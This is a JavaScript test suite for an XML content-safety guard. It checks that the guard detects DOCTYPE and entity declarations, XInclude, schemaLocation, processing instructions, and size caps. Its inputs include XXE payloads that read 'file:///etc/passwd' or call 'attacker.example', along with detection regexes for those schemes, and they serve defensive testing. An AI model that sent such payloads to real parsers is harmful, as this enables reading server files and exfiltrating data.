// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * guard-xml — XML content-safety primitive (b.guardXml).
 *
 * Covers: surface; registry parity; DOCTYPE rejection; ENTITY +
 * parameter-entity rejection; external-entity (file:// / http://
 * SYSTEM/PUBLIC) detection; XInclude detection; xsi:schemaLocation;
 * processing-instruction detection (skipping standard <?xml?>
 * declaration); CDATA detection; XML signature detection (audit);
 * bidi/null/control char detection; element-count + depth caps;
 * sanitize discipline (refuses on critical even with strip-able
 * options); profile + posture vocabulary.
 */

var helpers = require("../helpers");
var b       = helpers.b;
var check   = helpers.check;

function testGuardXmlSurface() {
  check("guardXml is an object",                    typeof b.guardXml === "object");
  check("guardXml.NAME === 'xml'",                  b.guardXml.NAME === "xml");
  check("guardXml.KIND === 'content'",              b.guardXml.KIND === "content");
  check("guardXml.MIME_TYPES has application/xml",  b.guardXml.MIME_TYPES.indexOf("application/xml") !== -1);
  check("guardXml.EXTENSIONS has .xml",             b.guardXml.EXTENSIONS.indexOf(".xml") !== -1);
  check("guardXml.PROFILES has strict",             !!b.guardXml.PROFILES["strict"]);
  check("guardXml.PROFILES has balanced",           !!b.guardXml.PROFILES["balanced"]);
  check("guardXml.PROFILES has permissive",         !!b.guardXml.PROFILES["permissive"]);
  check("guardXml.COMPLIANCE_POSTURES has hipaa",   !!b.guardXml.COMPLIANCE_POSTURES["hipaa"]);
  check("guardXml.validate is a function",          typeof b.guardXml.validate === "function");
  check("guardXml.sanitize is a function",          typeof b.guardXml.sanitize === "function");
  check("guardXml.gate is a function",              typeof b.guardXml.gate === "function");
  check("frameworkError.GuardXmlError exposed",     typeof b.frameworkError.GuardXmlError === "function");
}

function testXmlShapeScanAgreesWithThePatternsItReplaced() {
  var scan = b.guardXml._shapesForTest;

  var DOCTYPE_RE = /<!DOCTYPE\b/i;
  var ENTITY_DECL_RE = /<!ENTITY\b/i;
  var PARAM_ENTITY_RE = /<!ENTITY\s+%/i;
  var EXTERNAL_ENTITY_RE = /\b(SYSTEM|PUBLIC)\s+["'](file|http|https|ftp|gopher|jar|netdoc):/i;
  var XINCLUDE_RE = /<xi:include\b/i;
  var SCHEMA_LOCATION_RE = /\bxsi:(noNamespace)?[Ss]chemaLocation\s*=/;
  var PROCESSING_INSTR_RE = /<\?[A-Za-z][\w:-]*/;
  var CDATA_RE = /<!\[CDATA\[/;
  var XMLDSIG_RE = /<\w*:?Signature\b[^>]*xmldsig/i;
  var NCR_RE = /&#(?:[0-9]+|x[0-9a-fA-F]+);/g;
  var OPEN_TAG_RE = /<[A-Za-z][\w:-]*/g;
  var XML_DECL_RE = /^\s*<\?xml\s[^?]*\?>/;

  var DOCS = [
    "", "<root/>", '<?xml version="1.0"?><root><x>1</x></root>',
    // A keyword that runs into another identifier character is a longer word.
    "<!DOCTYPE html>", "<!doctype html>", "<!DOCTYPEX", "<!DOCTYPE", "<!DOCTYPE>",
    '<!ENTITY x "y">', "<!entity x>", "<!ENTITYX x>", "<!ENTITY", "<!ENTITY_",
    "<!ENTITY % pe SYSTEM 'http://x/'>", "<!ENTITY  \t % pe>", "<!ENTITY% pe>",
    "<!ENTITY\n%x>", "<!ENTITY" + String.fromCharCode(0x00A0) + "%x>",
    "<!ENTITY" + String.fromCharCode(0x3000) + "%x>",
    // The whitespace a parser accepts between the keyword and the literal is
    // every character the pattern's `\\s` covered, not the ASCII five.
    'SYSTEM "file:///etc/passwd"', "system 'http://x'", 'PUBLIC "-//X" "https://x"',
    'MYSYSTEM "file:x"', '_SYSTEM "file:x"', '-SYSTEM "file:x"',
    'SYSTEM"file:x"', 'SYSTEM  "file:x"', 'SYSTEM "FILE:x"',
    'SYSTEM "https:x"', 'SYSTEM "http:x"', 'SYSTEM "httpx:x"',
    'SYSTEM "jar:x"', 'SYSTEM "netdoc:x"', 'SYSTEM "gopher:x"',
    'SYSTEM "ftp:x"', 'SYSTEM "data:x"', 'SYSTEM "file"', "PUBLICX 'file:x'",
    "9SYSTEM 'file:x'", "éSYSTEM 'file:x'", "SYSTEM" + String.fromCharCode(0x00A0) + "'file:x'",
    "<xi:include href='x'/>", "<XI:INCLUDE/>", "<xi:includex/>", "<xi:include",
    "<xi:include_", "<xi:include>",
    'xsi:schemaLocation="a b"', 'xsi:noNamespaceSchemaLocation="a"',
    'xsi:noNamespaceschemaLocation="a"', 'xsi:SchemaLocation ="a"',
    "xsi:schemaLocation \t =", "xsi:schemaLocation", "xsi:schemaLocationX=",
    "XSI:schemaLocation=", "axsi:schemaLocation=", "_xsi:schemaLocation=",
    ".xsi:schemaLocation=", "xsi:noNamespacechemaLocation=",
    "xsi:noNamespaceSchemaLocationX=", "xsi:noNamespaceSchemaLocation" + String.fromCharCode(0x00A0) + "=",
    // Only the leading declaration is exempt; a second one is a directive.
    "<?xml-stylesheet href='x'?>", "<?xml version='1.0'?>",
    "<?xml version='1.0'?><?php echo 1;?>", "  <?xml v='1'?><?pi?>",
    "<?xml?>", "<?xml >", "<?xml\tv='1'?><?a?>", "<?9?>", "<? a?>",
    "<?xml a='?'?><?b?>", "<?xml a='<?c?'?>", "<?xml a=1", "<?xml a=1?",
    "\n\n<?xml v='1'?>", "<?xml v='1'?>trailing",
    "<![CDATA[x]]>", "<![cdata[x]]>", "<![CDATA", "a<![CDATA[",
    // The marker has to reach the element's own tag — a `>` closes the window.
    "<ds:Signature xmlns='xmldsig'/>", "<Signature xmldsig>",
    "<Signature>xmldsig", "<Signature xmldsig", "<SignatureX xmldsig>",
    "<dsSignature xmldsig>", "<:Signature xmldsig>", "<ds:SignatureX xmldsig>",
    "<ds:xSignature xmldsig>", "<SIGNATURE XMLDSIG>", "<Signature_ xmldsig>",
    "<Signature a='>' xmldsig>", "<ds:Signature>\n<x xmldsig>",
    "<Signature", "<Signature ", "xmldsig <Signature>",
    "<a><Signature xmldsig>", "<Signature x>xmldsig", "<x Signature xmldsig>",
    // The `x` of the hexadecimal form is lower case only, as XML 1.0 §4.1
    // writes it, so an upper-case one is not a character reference.
    "&#65;&#x41;&#X41;&#;&#x;&#12a;&#xzz;&#0;", "&#65", "&#65;&#66;",
    "&&#65;", "&#x0041;&#X0041;",
    "&#" + String.fromCharCode(0x00A0) + "65;",
    "<a><b-c><d:e><1x><_x><éx>", "<a/><a/>", "< a>", "<a-b_c:d.e>",
    '<?xml v=\'1\'?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://x">]>' +
      '<r xsi:schemaLocation="a"><![CDATA[&#65;]]></r>',
  ];

  var diffs = [];
  DOCS.forEach(function (doc) {
    var want = {
      doctype:        DOCTYPE_RE.test(doc),
      entityDecl:     ENTITY_DECL_RE.test(doc),
      paramEntity:    PARAM_ENTITY_RE.test(doc),
      externalEntity: EXTERNAL_ENTITY_RE.test(doc),
      xinclude:       XINCLUDE_RE.test(doc),
      schemaLocation: SCHEMA_LOCATION_RE.test(doc),
      cdata:          CDATA_RE.test(doc),
      xmlDsig:        XMLDSIG_RE.test(doc),
      processingInstr: PROCESSING_INSTR_RE.test(doc) &&
                       PROCESSING_INSTR_RE.test(doc.replace(XML_DECL_RE, "")),
      ncrCount:       (doc.match(NCR_RE) || []).length,
      openTagCount:   (doc.match(OPEN_TAG_RE) || []).length,
    };
    var got = scan(doc);
    Object.keys(want).forEach(function (key) {
      if (want[key] !== got[key]) {
        diffs.push(key + " " + JSON.stringify(doc.slice(0, 40)) +
                   " want " + want[key] + " got " + got[key]);
      }
    });
  });

  check("the XML source scan agrees with every pattern it replaced (" +
        DOCS.length + " documents)", diffs.length === 0, diffs.slice(0, 5).join(" | "));

  // Reading each threat separately meant a document that is one long run of a
  // shared prefix was walked once per screen, and the cap that bounds this
  // input is a BYTE cap — so the attacker picks the multiplier.
  var PREFIX_FLOOD_MS = 4000;
  [["<!", 1000000], ["<?", 1000000], ["<a", 1000000], ["&#1", 700000],
   ["<Signature ", 200000], ["SYSTEM \"", 300000], ["xsi:", 500000]].forEach(function (c) {
    var doc = c[0].repeat(c[1]);
    var started = Date.now();
    scan(doc);
    var elapsed = Date.now() - started;
    check("a " + doc.length + "-character run of " + JSON.stringify(c[0]) +
          " scans in linear time (" + elapsed + "ms)", elapsed < PREFIX_FLOOD_MS);
  });
}

function testGuardXmlRegistryParity() {
  check("guardXml registered in guardAll",
        b.guardAll.list().some(function (g) { return g.name === "xml"; }));
}

function testGuardXmlDoctype() {
  var rv = b.guardXml.validate(
    '<?xml version="1.0"?>\n<!DOCTYPE root>\n<root/>',
    { profile: "strict" });
  check("DOCTYPE detected (XXE / billion-laughs vector)",
        rv.ok === false &&
        rv.issues.some(function (i) { return i.kind === "doctype"; }));
}

function testGuardXmlEntityDeclaration() {
  var rv = b.guardXml.validate(
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "y">]><r>&x;</r>',
    { profile: "strict" });
  check("<!ENTITY> declaration detected",
        rv.issues.some(function (i) { return i.kind === "entity-declaration"; }));
}

function testGuardXmlParameterEntity() {
  var rv = b.guardXml.validate(
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p "v">]><r/>',
    { profile: "strict" });
  check("parameter entity (% prefix) detected",
        rv.issues.some(function (i) { return i.kind === "parameter-entity"; }));
}

function testGuardXmlExternalEntity() {
  var rv = b.guardXml.validate(
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    { profile: "strict" });
  check("external SYSTEM file:// entity detected (XXE)",
        rv.issues.some(function (i) { return i.kind === "external-entity"; }));

  var rvHttp = b.guardXml.validate(
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://attacker.example/x">]><r/>',
    { profile: "strict" });
  check("external SYSTEM http:// entity detected (XXE OOB exfil)",
        rvHttp.issues.some(function (i) { return i.kind === "external-entity"; }));
}

function testGuardXmlXInclude() {
  var rv = b.guardXml.validate(
    '<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="x"/></r>',
    { profile: "strict" });
  check("XInclude detected (CVE-2024-25062 class)",
        rv.issues.some(function (i) { return i.kind === "xinclude"; }));
}

function testGuardXmlSchemaLocation() {
  var rv = b.guardXml.validate(
    '<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://attacker/s.xsd">x</r>',
    { profile: "strict" });
  check("xsi:schemaLocation detected",
        rv.issues.some(function (i) { return i.kind === "schema-location"; }));
}

function testGuardXmlProcessingInstruction() {
  var rv = b.guardXml.validate(
    '<?xml-stylesheet type="text/css" href="x.css"?><r/>',
    { profile: "strict" });
  check("xml-stylesheet processing-instruction detected (CSS injection vector)",
        rv.issues.some(function (i) { return i.kind === "processing-instruction"; }));

  // Standard <?xml?> declaration should NOT be flagged.
  var rvStd = b.guardXml.validate('<?xml version="1.0"?><r/>', { profile: "strict" });
  check("standard <?xml?> declaration NOT flagged",
        !rvStd.issues.some(function (i) { return i.kind === "processing-instruction"; }));
}

function testGuardXmlCdata() {
  var rv = b.guardXml.validate(
    '<r><![CDATA[hidden payload]]></r>',
    { profile: "strict" });
  check("CDATA section detected",
        rv.issues.some(function (i) { return i.kind === "cdata"; }));
}

function testGuardXmlBidiNull() {
  var bidi = String.fromCharCode(0x202E);
  var rv = b.guardXml.validate("<r>a" + bidi + "b</r>", { profile: "strict" });
  check("bidi override detected",
        rv.issues.some(function (i) { return i.kind === "bidi-override"; }));

  var nb = String.fromCharCode(0);
  var rvNull = b.guardXml.validate("<r>a" + nb + "b</r>", { profile: "strict" });
  check("null byte detected",
        rvNull.issues.some(function (i) { return i.kind === "null-byte"; }));
}

function testGuardXmlElementCap() {
  var src = "<root>";
  for (var i = 0; i < 10000; i++) src += "<x/>";
  src += "</root>";
  var rv = b.guardXml.validate(src, { profile: "strict" });
  check("element cap detected (strict 8192)",
        rv.issues.some(function (i) { return i.kind === "element-cap"; }));
}

function testGuardXmlByteCap() {
  // The cap is named in BYTES; it must measure UTF-8 bytes, not UTF-16
  // code units. "é" is one .length unit but two UTF-8 bytes, so a string
  // whose .length is under the cap can still exceed it in bytes.
  var multibyte = "é".repeat(40); // .length === 40, Buffer.byteLength === 80
  var rv = b.guardXml.validate(multibyte, { profile: "strict", maxBytes: 50 });
  var cap = rv.issues.filter(function (i) { return i.kind === "too-large"; });
  check("multibyte input over the byte cap is refused",
        rv.ok === false && cap.length === 1 &&
        cap[0].ruleId === "xml.too-large" &&
        /80 bytes exceeds maxBytes 50/.test(cap[0].snippet));

  // ASCII under the cap must NOT trip too-large.
  var underAscii = "a".repeat(40);
  var rvUnder = b.guardXml.validate(underAscii, { profile: "strict", maxBytes: 50 });
  check("ASCII input under the byte cap is not flagged too-large",
        !rvUnder.issues.some(function (i) { return i.kind === "too-large"; }));

  // ASCII over the cap still trips too-large.
  var overAscii = "a".repeat(60);
  var rvOver = b.guardXml.validate(overAscii, { profile: "strict", maxBytes: 50 });
  check("ASCII input over the byte cap is refused",
        rvOver.issues.some(function (i) { return i.kind === "too-large"; }));
}

function testGuardXmlBadInputRuleId() {
  var rv = b.guardXml.validate(12345, { profile: "strict" });
  check("non-string input carries xml.bad-input ruleId",
        rv.issues.some(function (i) {
          return i.kind === "bad-input" && i.ruleId === "xml.bad-input";
        }));
}

function testGuardXmlClean() {
  var rv = b.guardXml.validate(
    '<?xml version="1.0"?><root><name>alice</name><age>30</age></root>',
    { profile: "strict" });
  check("clean XML → ok=true with no issues",
        rv.ok === true && rv.issues.length === 0);
}

function testGuardXmlSanitizeRefusesCritical() {
  var threw = null;
  try { b.guardXml.sanitize(
    '<?xml version="1.0"?><!DOCTYPE r><r/>', { profile: "balanced" }); }
  catch (e) { threw = e; }
  check("sanitize refuses DOCTYPE (no safe sanitization)",
        threw && /doctype/.test(threw.code || threw.message || ""));
}

async function testGuardXmlGate() {
  var g = b.guardXml.gate({ profile: "strict" });
  var clean = await g.check({
    contentType: "application/xml",
    bytes:       Buffer.from("<r>safe</r>", "utf8"),
  });
  check("gate clean → action=serve",
        clean.ok === true && clean.action === "serve");

  var hostile = await g.check({
    contentType: "application/xml",
    bytes:       Buffer.from(
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "y">]><r/>', "utf8"),
  });
  check("gate XXE → action !== serve",
        hostile.action !== "serve");
}

function testGuardXmlCompliancePosture() {
  var hipaa = b.guardXml.compliancePosture("hipaa");
  check("compliancePosture('hipaa') sets reject policies",
        hipaa.doctypePolicy === "reject" && hipaa.entityPolicy === "reject");
  var threw = null;
  try { b.guardXml.compliancePosture("unknown"); }
  catch (e) { threw = e; }
  check("compliancePosture: unknown name throws",
        threw && /unknown/.test(threw.message));
}

async function run() {
  testGuardXmlSurface();
  testXmlShapeScanAgreesWithThePatternsItReplaced();
  testGuardXmlRegistryParity();
  testGuardXmlDoctype();
  testGuardXmlEntityDeclaration();
  testGuardXmlParameterEntity();
  testGuardXmlExternalEntity();
  testGuardXmlXInclude();
  testGuardXmlSchemaLocation();
  testGuardXmlProcessingInstruction();
  testGuardXmlCdata();
  testGuardXmlBidiNull();
  testGuardXmlElementCap();
  testGuardXmlByteCap();
  testGuardXmlBadInputRuleId();
  testGuardXmlClean();
  testGuardXmlSanitizeRefusesCritical();
  testGuardXmlCompliancePosture();
  await testGuardXmlGate();
}

module.exports = { run: run };

if (require.main === module) {
  run().then(
    function () { console.log("[guard-xml] OK — " + helpers.getChecks() + " checks passed"); },
    function (e) { console.error("FAIL:", (e && e.stack) || e); process.exit(1); }
  );
}
